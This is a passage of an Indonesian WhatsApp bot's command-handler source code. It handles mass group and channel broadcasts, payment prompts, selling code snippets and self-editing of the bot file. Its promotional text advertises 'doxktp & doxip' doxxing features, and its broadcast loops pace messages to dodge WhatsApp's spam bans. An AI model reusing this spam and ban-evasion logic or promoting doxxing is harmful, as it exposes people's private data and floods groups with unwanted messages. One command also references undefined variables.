• Ban Pengguna ( Tdk Bisa Menggunakan Bot )
• doxktp & doxip
• Cek Langsung Saja Fitur Nya Dibot Kami !!

🐦 Channel Update:
👉 https://whatsapp.com/channel/0029VayQ6hhKmCPSQtI26w3i

📌 Cek Fitur Bot:
👉 Bot wa.me/6282286499979?text=.menu

📌 Stock Tersedia:
👉 Bot wa.me/6282286499979?text=.stock

💵 Harga ? Pm Aja 
📞 wa.me/62895373974000`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/script3.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'jpm': {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return Reply(example("💬 Masukkan teks yang akan dikirim"))
    let allgrup = await conn.groupFetchAllParticipating()
    let res = await Object.keys(allgrup)
    let count = 0
    const jid = m.chat
    const teks = text

    // Mendapatkan tanggal dan waktu WIB
    let now = new Date()
    let formatter = new Intl.DateTimeFormat('id-ID', { 
        timeZone: 'Asia/Jakarta', 
        dateStyle: 'full', 
        timeStyle: 'medium' 
    })
    let waktuMulai = formatter.format(now)

    // Pesan memulai
    await Reply(`🚀 *Proses JPM Dimulai!* 🚀\n📋 Total Grup: ${res.length}\n🕒 Tanggal dan Waktu Mulai: ${waktuMulai}\n\n🔥 Harap tunggu, proses sedang berlangsung... 🔄`)
    
    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
        try {
            await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
            count += 1
        } catch {}
        await sleep(global.delayJpm)
    }

    // Mendapatkan waktu selesai
    now = new Date()
    let waktuSelesai = formatter.format(now)

    // Pesan selesai
    await conn.sendMessage(jid, {
        text: `✅ *Proses JPM Selesai!* ✅\n\n📆 *Tanggal dan Waktu Selesai:*\n${waktuSelesai}\n\n📊 *Total Grup Berhasil:* ${count}\n\n✨ Terima kasih telah menggunakan layanan ini! 🎉`,
        quoted: qlocJpm
    })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpm2': {
    if (!isCreator) return Reply("❌ *Akses Ditolak!* Hanya untuk creator.")
    if (!q) return Reply("💬 Masukkan teks dengan mengirim foto.")
    if (!/image/.test(mime)) return Reply("🖼️ Harap kirim gambar bersama teks.")
    
    const allgrup = await conn.groupFetchAllParticipating()
    const res = await Object.keys(allgrup)
    let count = 0
    const teks = text
    const jid = m.chat
    const rest = await conn.downloadAndSaveMediaMessage(qmsg)

    // Mendapatkan tanggal dan waktu WIB
    let now = new Date()
    let formatter = new Intl.DateTimeFormat('id-ID', { 
        timeZone: 'Asia/Jakarta', 
        dateStyle: 'full', 
        timeStyle: 'medium' 
    })
    let waktuMulai = formatter.format(now)

    // Pesan memulai
    await Reply(`🚀 *Proses JPM2 Dimulai!* 🚀\n📋 Total Grup: ${res.length}\n🕒 *Tanggal dan Waktu Mulai:*\n${waktuMulai}\n\n🔥 Harap tunggu, proses sedang berlangsung... 🔄`)

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
        try {
            await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
            count += 1
        } catch {}
        await sleep(global.delayJpm)
    }

    await fs.unlinkSync(rest)

    // Mendapatkan waktu selesai
    now = new Date()
    let waktuSelesai = formatter.format(now)

    // Pesan selesai
    await conn.sendMessage(jid, {
        text: `✅ *Proses JPM2 Selesai!* ✅\n\n📆 *Tanggal dan Waktu Selesai:*\n${waktuSelesai}\n\n📊 *Total Grup Berhasil:* ${count}\n\n✨ Terima kasih telah menggunakan layanan ini! 🎉`,
        quoted: qlocJpm
    })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpmtesti': {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'payment': case 'qris': {
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                   },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'QRIS',
                  id: '.qris'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listuangkas': {
    if (!isCreator) return Reply(mess.owner);

    let uangkasPath = './src/uangkas.json';
    let uangkasList = [];

    // Cek apakah file uangkas.json sudah ada
    if (fs.existsSync(uangkasPath)) {
        uangkasList = JSON.parse(fs.readFileSync(uangkasPath));
    }

    if (uangkasList.length < 1) {
        return m.reply("Tidak ada data uang kas saat ini. ❌");
    }

    let totalSemua = 0;
    let teksnya = `📜 *DAFTAR UANG KAS* 📜\n\n`;

    uangkasList.forEach((u, i) => {
        teksnya += `➡️ ${i + 1}. 💳 *Metode*: ${u.metode}\n` +
                   `   💰 *Nominal*: Rp${u.nominal.toLocaleString("id-ID")}\n` +
                   `   📞 *Nomor*: ${u.nomor}\n` +
                   `   📅 *Tanggal*: ${u.tanggal}\n\n`;

        totalSemua += u.nominal; // Menjumlahkan total uang kas
    });

    teksnya += `━━━━━━━━━━━━━━━━━━━━\n` +
               `🤑 *TOTAL SEMUA UANG KAS*: Rp${totalSemua.toLocaleString("id-ID")}\n`;

    conn.sendMessage(m.chat, { text: teksnya }, { quoted: qtoko });

    // Tambahkan data baru setelah menampilkan daftar uang kas
    let newData = {
        metode: metodeNama,
        nominal: parseInt(nominal),
        nomor: nomor,
        tanggal: new Date().toLocaleString()
    };

    uangkasList.push(newData);
    fs.writeFileSync(uangkasPath, JSON.stringify(uangkasList, null, 2));
}
break;

case 'resetuangkas': {
    if (!isCreator) return Reply(mess.owner);

    let uangkasPath = './src/uangkas.json';

    // Reset data uang kas dengan mengosongkan file JSON
    fs.writeFileSync(uangkasPath, JSON.stringify([], null, 2));

    m.reply("✅ Semua data uang kas telah direset.");
}
break;

case 'pay': {  
    if (!isCreator) return;

    let args = text.split(' ');  
    if (args.length < 2) {
        return Reply(`❌ *Format salah!*\n🔹 Penggunaan: ${prefix+command} <metode> <nominal>\n🔹 Contoh: ${prefix+command} dana 50000`);
    }

    let metode = args[0].toLowerCase();  
    let nominal = args[1].trim();  

    if (!nominal || isNaN(nominal) || nominal <= 0) {
        return Reply(`❌ *Format salah!*\n🔹 Nominal harus berupa angka yang valid.`);
    }

    let nomor;
    let metodeNama;

    switch (metode) {
        case 'dana':
            nomor = global.dana;
            metodeNama = 'DANA';
            break;
        case 'ovo':
            nomor = global.ovo;
            metodeNama = 'OVO';
            break;
        case 'gopay':
            nomor = global.gopay;
            metodeNama = 'GoPay';
            break;
        case 'shopeepay':
            nomor = global.shopeepay;
            metodeNama = 'ShopeePay';
            break;
        default:
            return Reply(`❌ *Metode pembayaran tidak tersedia!*\n🔹 Pilihan: dana, ovo, gopay, shopeepay`);
    }

    // Simpan transaksi ke uangkas.json
    let uangkasPath = './src/uangkas.json';
    let uangkasList = [];

    // Cek apakah file uangkas.json sudah ada
    if (fs.existsSync(uangkasPath)) {
        uangkasList = JSON.parse(fs.readFileSync(uangkasPath));
    }

    let newData = {
        metode: metodeNama,
        nominal: parseInt(nominal),
        nomor: nomor,
        tanggal: new Date().toLocaleString()
    };

    uangkasList.push(newData);
    fs.writeFileSync(uangkasPath, JSON.stringify(uangkasList, null, 2));

    let teks = `
💰 *PAYMENT ${metodeNama} ${global.namaOwner.toUpperCase()}* 💰

📌 *Nomor:* ${nomor}  
💵 *Nominal:* Rp ${nominal}  

⚠️ *[ ! ] Penting:*  
\`\`\`✅ Wajib kirimkan bukti transfer demi keamanan bersama ✅\`\`\`
`;

    await conn.sendMessage(m.chat, { text: teks }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'bukti': {
    let jumlah = args[0]
    if (!jumlah) return Reply('⚠️ Jumlah nya?')
    Reply('✅ OKE KAK, DEPOSIT SEDANG DI PROSES ⏳ MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT 💰')

    let nomorPengguna = m.sender.split('@')[0] // Mengambil nomor tanpa simbol @

    conn.sendMessage(
        `62895373974000@s.whatsapp.net`,
        { 
            text: `🔥 *ADA YANG DEPOSIT NIH* 🔥\n💰 *SEJUMLAH ${jumlah} DARI ${nomorPengguna}*\n⚡ *INGIN ACC DEPOSIT? KETIK:*\n✅ *${prefix}acc* ❌ *MAU NOLAK? BIARIN AJA*`
        },
        { quoted: m }
    )
}
break

case 'qris2': {
if (!isCreator) return 
await conn.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS 々 IjulTaka || 乂*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ambilq': case 'p': {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'toaudio': case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await conn.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await conn.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'proses': {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'done': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 4) return Reply(`*Format salah!*
Penggunaan:
${prefix + command} trx,barang,harga,tanggal`);
    let trx = t[0];
    let barang = t[1];
    let price = t[2];
    let date = t[3];
    var teks = `
*#${trx}*
𝗔𝗟𝗛𝗔𝗠𝗗𝗨𝗟𝗜𝗟𝗟𝗔𝗛 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗗𝗢𝗡𝗘 ✅
━━━━━━━━━━━━━━━━━━━━
📦 BARANG   : ${barang}
🔖 PRICE       : ${price}
📅 DATE          : ${date}
*TERIMAKASIH SUDAH MEMBELI DI ${namaOwner}🥵*

*々 IjulTaka || 乂 Menyediakan*

*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*

*»»—— Produk Lainnya ——««*
*» Panel Public 1Gb - Unli*
*» Panel Private 1Gb - Unli*
*» Murid Buat Fitur : 50/45K*
*» Domain my.id .tech dll : 10K*
*» Reseller Subdomain : 15K*
*» Murid Subdomain Full Akses Cf : 15K*
*» Jasa Rename Script: 10K*
*» Jasa Fix Script dll*
*» Reseller Panel Public : 10K*
*» Reseller Panel Private : 15K*
*» Admin Panel : 20K*
*» Pt Panel : 50K*
*» Own Panel : 40K*
*» Sc Wa/Tele*
*» Dll Tanyakan*
*» NOTE: BISA GUNAKAN BOT DARI NO DI BAWAH*

*»»—— Contacts Person ——««*
*Wa :* wa.me/62895373974000
*Tele :* t.me/々 IjulTaka || 乂
*Channel :* https://whatsapp.com/channel/0029VaqgmI2Jf05dg5Fweh0T

© 々 IjulTaka || 乂`;

    // Kirim pesan tanpa button
    await conn.sendMessage(m.chat, { text: teks }, { quoted: qtext2 });
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'developerbot':  
case 'owner': {  
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
    let contact = {  
        contacts: {  
            displayName: "Developer Bot",  
            contacts: [{  
                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Owner Bot\nTEL;type=CELL;waid=${global.owner}:${global.owner}\nEND:VCARD`  
            }]  
        }  
    };  

    await conn.sendMessage(m.chat, contact, { quoted: m });  
}  
break;

case 'buysaldo' : {  
    let contact = {  
        contacts: {  
            displayName: "Developer",  
            contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Owner\nTEL;type=CELL;waid=${global.owner}:${global.owner}\nEND:VCARD` }]  
        }  
    };  

    await conn.sendMessage(m.chat, contact, { quoted: m });  

    await conn.sendMessage(m.chat, {  
        text: `📢 *Ingin membeli saldo?* 💰\n\nSilakan hubungi nomor di atas untuk informasi lebih lanjut!`,  
        mentions: [global.owner + "@s.whatsapp.net"]  
    }, { quoted: m });  
}  
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'save': case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'self': {
if (!isCreator) return
conn.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'addcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh: .addcase} *casenya*`);
    const namaFile = path.join(__dirname, 'sikima.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return m.reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return m.reply(result.message);
        }
    });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delcase': {
    if (!isOwner) return onlyOwn();
    if (!text) 
        return m.reply(`Contoh: .delcase *nama_case*`);

    const fs = require('fs').promises;

    async function removeCase(filePath, caseNameToRemove) {
        try {
            let data = await fs.readFile(filePath, 'utf8');
            
            // Regex untuk mencari dan menghapus blok kode case
            const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
            const modifiedData = data.replace(regex, '');

            if (data === modifiedData) {
                m.reply('Case tidak ditemukan atau sudah dihapus.');
                return;
            }

            await fs.writeFile(filePath, modifiedData, 'utf8');
            m.reply('Sukses menghapus case!');
        } catch (err) {
            m.reply(`Terjadi kesalahan: ${err.message}`);
        }
    }

    removeCase('./sikima.js', text);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'sendfitur':
case 'kirimfitur': {
    if (!isCreator) return Reply("❌ *Akses Ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!text) return Reply(`📋 *Format Salah!*\n\n📌 *Contoh:* ${prefix + command} menu`);

    const getCase = async (caseName) => {
        try {
            const fileContent = await fs.promises.readFile('./sikima.js', 'utf-8');
            const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
            const match = fileContent.match(caseRegex);
            if (!match) {
                return Reply(`❌ *Case "${caseName}" tidak ditemukan!*\n🛠️ Pastikan nama case sudah benar.`);
            }
            return match[0];
        } catch (error) {
            return Reply(`⚠️ *Terjadi kesalahan saat membaca file:*\n🛠️ ${error.message}`);
        }
    };

    const args = text.trim().split(" ");
    const caseName = args[0];
    let recipient = args[1];

    if (m.quoted) {
        recipient = m.quoted.sender;
    } else if (m.mentionedJid.length > 0) {
        recipient = m.mentionedJid[0];
    } else if (recipient && !recipient.includes('@s.whatsapp.net')) {
        recipient = recipient.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    }

    if (!recipient) {
        return Reply("⚠️ *Masukkan nomor WhatsApp penerima atau kutip pesan seseorang!*");
    }

    getCase(caseName)
        .then(async (caseCode) => {
            try {
                const [contact] = await conn.onWhatsApp(recipient.split('@')[0]);
                if (!contact || !contact.exists) {
                    return Reply("❌ *Nomor tidak terdaftar di WhatsApp!*");
                }

                const message = `🎉 *Halo!*\n\n✨ *Kamu mendapatkan kiriman fitur:*\n\n${caseCode}`;
                await conn.sendMessage(recipient, { text: message }, { quoted: m });

                Reply("✅ *Fitur berhasil terkirim!*\n📤 Pesan telah dikirim ke penerima.");
            } catch (error) {
                console.error("❌ *Terjadi kesalahan:*", error.message);
                Reply("⚠️ *Kesalahan saat mengirim fitur:*\n" + error.message);
            }
        })
        .catch((error) =>
            Reply(`⚠️ *Terjadi kesalahan saat memproses case:*\n🛠️ ${error.message}`)
        );
}
break;

case 'buycase': {
    if (!text) return m.reply("⚡ Gunakan format: *.buycase namacase*");
    let caseName = text.trim();
    
    // Harga per case (random minimal 10.000, naik kelipatan 5.000)
    const hargaCase = 10000 + (Math.floor(Math.random() * 5) * 5000);
    
    if (db.users[m.sender].status_deposit) 
        return m.reply("⚠️ Masih ada transaksi yang belum diselesaikan! Ketik *.batalbeli* untuk membatalkan.");

    let transactionId = crypto.randomBytes(4).toString('hex');
    let amount = hargaCase + generateRandomNumber(110, 250); // Ditambah angka unik agar tidak sama

    // Request pembayaran ke API Order Kuota
    let paymentResponse = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`);

    if (!paymentResponse.data.result) 
        return m.reply("❌ Gagal membuat transaksi pembayaran. Coba lagi nanti!");

    const { qrImageUrl, transactionId: idTransaksi, amount: totalBayar } = paymentResponse.data.result;

    let teksPembayaran = `
🛒 *INFORMASI PEMBAYARAN* 🛒
    
💳 *ID Transaksi:* ${idTransaksi}
💰 *Total Bayar:* Rp${await toIDR(totalBayar)}
📦 *Produk:* Case ${caseName}
⏳ *Batas Waktu:* 5 menit

⚠️ *Note:* Jika pembayaran tidak dilakukan dalam 5 menit, transaksi akan dibatalkan otomatis.
`;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: `.batalbeli`,
                buttonText: { displayText: '❌ Batalkan Pembelian' },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: qrImageUrl },
        caption: teksPembayaran,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi pengguna
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].transaksi = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: idTransaksi,
        amount: totalBayar.toString(),
        caseName: caseName,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].transaksi.amount == totalBayar.toString()) {
                    await conn.sendMessage(db.users[m.sender].transaksi.chat, { text: "⏳ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].transaksi.msg });
                    await conn.sendMessage(db.users[m.sender].transaksi.chat, { delete: db.users[m.sender].transaksi.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].transaksi;
                }
            }, 300000); // 5 menit
        }
    };

    await db.users[m.sender].transaksi.exp();

    // Cek status pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        let cekStatus = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        let dataStatus = cekStatus.data;

        if (db.users[m.sender].transaksi && dataStatus?.amount == totalBayar.toString()) {
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].transaksi;

            await conn.sendMessage(db.users[m.sender].chat, { text: `
✅ *PEMBAYARAN BERHASIL* ✅

💳 *ID:* ${idTransaksi}
💰 *Total Bayar:* Rp${await toIDR(totalBayar)}
📦 *Case:* ${caseName}
` }, { quoted: msgQr });

            // Kirim case ke pengguna setelah pembayaran sukses
            let getcase = (cases) => {
                return 'case ' + `'${cases}'` + fs.readFileSync('./sikima.js').toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
            };

            try {
                let caseContent = getcase(caseName);
                m.reply(`🎉 *Berhasil Membeli Case* 🎉\n\n${caseContent}`);
            } catch (e) {
                return m.reply(`⚠️ Case *${caseName}* tidak ditemukan.`);
            }
        }
    }
}
break;

case 'getcase': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example('menu'))
const getcase = (cases) => {
return 'case '+`\'${cases}\'`+fs.readFileSync('./sikima.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cekcase': {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply(`Contoh: ${prefix+command} caseName`);
const caseName = text.trim();
if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Contoh: ${prefix+command} caseName`);
const cekCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./sikima.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const caseLines = match[0].split('\n');
const startLine = lines.indexOf(caseLines[0]) + 1;
const endLine = startLine + caseLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekCase(caseName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*CASE DITEMUKAN!*
• Nama Case: ${caseName}
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}

Mau sekalian di ambil?`;
let kon = `{\"display_text\":\"YA\",\"id\":\"${prefix}getcase 1 ${text}\"}`
quickreply1(m.chat, message, kon, m)
userSessions[m.sender] = { caseToRetrieve: result, caseName };
} else {
m.reply(`Case '${caseName}' tidak ditemukan.`);
}
break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listcase': {
if (!isCreator) return m.reply(mess.owner)
let { listCase } = require('./library/database/listcase.js')
m.reply(listCase())
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ping': case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'public': {
if (!isCreator) return
conn.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restart': case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'upchannel': case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await conn.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'upchannel2': case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'kirimsc': case 'sendsc': {
 if (!isCreator) return Reply(`Hanya Developer !!`);
 
 // Ambil nomor tujuan dari args
 let targetNumber = args[0] ? args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net' : null;
 if (!targetNumber) return Reply('Harap masukkan nomor tujuan.');

 await Reply('Mengumpulkan semua file ke folder...');
 const { execSync } = require("child_process");
 
 // Filter file yang akan dimasukkan ke dalam backup
 const ls = (await execSync("ls"))
 .toString()
 .split("\n")
 .filter((file) =>
 file != "node_modules" &&
 file != "session" &&
 file != "package-lock.json" &&
 file != "yarn.lock" &&
 file != ""
 );

 await Reply('Membuat arsip ZIP...');
 const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
 
 // Mengirimkan file ke nomor tujuan
 await conn.sendMessage(targetNumber, {
 document: await fs.readFileSync("./backup.zip"),
 mimetype: "application/zip",
 fileName: "simplebotv5.zip",
 }, { quoted: m });
 
 await execSync("rm -rf backup.zip");
 Reply(`Backup berhasil dikirim ke nomor: ${targetNumber}`);
}
break;

case 'backup': {
if (!isCreator) return Reply(`Hanya Developer !!`)
